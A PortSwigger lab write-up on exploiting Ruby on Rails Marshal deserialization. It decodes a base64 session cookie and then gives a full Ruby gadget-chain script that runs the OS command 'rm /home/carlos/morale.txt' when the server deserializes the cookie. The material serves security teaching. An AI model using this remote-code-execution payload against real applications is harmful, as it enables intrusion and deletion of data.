# Exploiting Ruby deserialization using a documented gadget chain

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain), you'll learn: Exploiting Ruby deserialization using a documented gadget chain! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112141522.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112141533.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112141548.png)

**When we successfully logged in, it'll set a new session cookie:**
```
BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVzNTh0b2t0NHZ1NDVmNWRqcHdheDFxajVqMXF4YXpwMAY7B0YK
```

**It seems like it's encoded in base64. Let's decode that:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 14:18:33
╰─○ echo 'BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVzNTh0b2t0NHZ1NDVmNWRqcHdheDFxajVqMXF4YXpwMAY7B0YK' | base64 -d | xxd
00000000: 0408 6f3a 0955 7365 7207 3a0e 4075 7365  ..o:.User.:.@use
00000010: 726e 616d 6549 220b 7769 656e 6572 063a  rnameI".wiener.:
00000020: 0645 463a 1240 6163 6365 7373 5f74 6f6b  .EF:.@access_tok
00000030: 656e 4922 2573 3538 746f 6b74 3476 7534  enI"%s58tokt4vu4
00000040: 3566 3564 6a70 7761 7831 716a 356a 3171  5f5djpwax1qj5j1q
00000050: 7861 7a70 3006 3b07 460a                 xazp0.;.F.
```

As you can see, the decoded output is a **ruby serialized object**.

**It contains object `User`, attribute 1 `username`, and attribute 2 `access_token`.**

**Let's google "ruby deserialization gadget chain":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112144048.png)

**In this [blog](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html), it explained how to construct Ruby deserialization gadget chains very well, I strongly recommend you read through all of it.**

**Also, it has a Ruby script that generates a Ruby serialized object gadget chain payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112144142.png)

**In here, we need to change the `id` OS command to `rm /home/carlos/morale.txt`, and base64 encode the output:**
```ruby
require 'base64'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

**Run that payload in [Ruby online compiler](https://www.tutorialspoint.com/execute_ruby_online.php):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112152930.png)

**Copy the output and paste it to the session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112152947.png)

**Finally, refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-7/images/Pasted%20image%2020230112152959.png)

Nice!

# What we've learned:

1. Exploiting Ruby deserialization using a documented gadget chain